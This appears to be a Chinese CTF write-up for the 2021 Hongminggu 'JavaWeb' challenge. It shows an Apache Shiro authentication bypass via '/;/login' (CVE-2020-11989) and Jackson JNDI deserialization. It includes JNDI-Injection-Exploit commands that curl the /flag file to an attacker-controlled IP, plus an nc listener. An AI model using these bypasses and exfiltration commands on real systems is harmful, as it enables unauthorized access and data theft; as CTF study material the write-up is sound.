---
title: '[红明谷CTF 2021]JavaWeb'
date: 2024-11-07 19:06:07
tags: 
      - Shiro漏洞
      - 漏洞
categories: 刷题笔记
---

### [红明谷CTF 2021]JavaWeb

原题目提示/login，那我们访问/login看看

![image-20241107192013992](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411071920111.png)

题目提示/json路径，那我们继续访问json

![image-20241107192147062](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411071921127.png)

我们发现页面重定向到了/login路径，我们考虑用post方法访问/login

![image-20241107192245184](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411071922234.png)

页面提示我们登陆失败，这表明在这里我们需要进行身份认证，

但在这里我们在cookie里发现有个rememberMe=deleteMe，很明显是个shiro框架，

在这里我们用到CVE-2020-11989 : Apache Shiro权限绕过

**访问`/;/login`时便可以绕过shiro认证查看需要登录认证的信息了(CVE-2020-11989 : Apache Shiro权限绕过)**

但在这里提示我们需要输入一个实体

![image-20241107193330381](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411071933441.png)

我们输入一个json数据 {username="admin",password="admin"} 后还是报错，

![image-20241107193447515](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411071934557.png)

一直修改数据格式都没有用,不过最后直接复制报错的message信息搜了一下, 发现是Jackson的问题, 也就是说用到了Jackson

猜测这里可能会存在反序列化漏洞。我们用JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar这个工具来进行反序列化漏洞利用，并将flag外带

使用命令如下

```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C 'curl 60.204.158.87:39767 -File=@/flag' -A "60.204.158.87"

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C 'curl [VPS_IP:PORT] -file=@/flag' -A "[VPS_IP]"
```

如果运行报错，还要进行

![image-20241107210550999](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411072105089.png)

然后再target运行命令

![image-20241107211101207](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411072111269.png)

然后我们新建一个窗口，监听端口

```
nc -lnvp 9999
```

最后我们用CVE-2019-14439的链子打进去，用上面的springboot的payload

这一步我们用postman执行

```

```

![image-20241107211230559](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411072112599.png)

**最后**在监听的地方得到flag

![image-20241107211259685](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411072112720.png)

（我没弹出来哈，不知道为啥）

参考：https://juejin.cn/post/7106654301883219998

​          https://blog.csdn.net/Mrs_H/article/details/124035038

​		https://www.zhaoj.in/read-6859.html#WEB1_javaweb



### CVE-2020-11989

影响范围

- Apache Shiro < 1.5.3
- Spring 框架中只使用 Shiro 鉴权

可以使用/;/进行绕过

参考：https://mp.weixin.qq.com/s/yb6Tb7zSTKKmBlcNVz0MBA

 https://xlab.tencent.com/cn/2020/06/30/xlab-20-002/
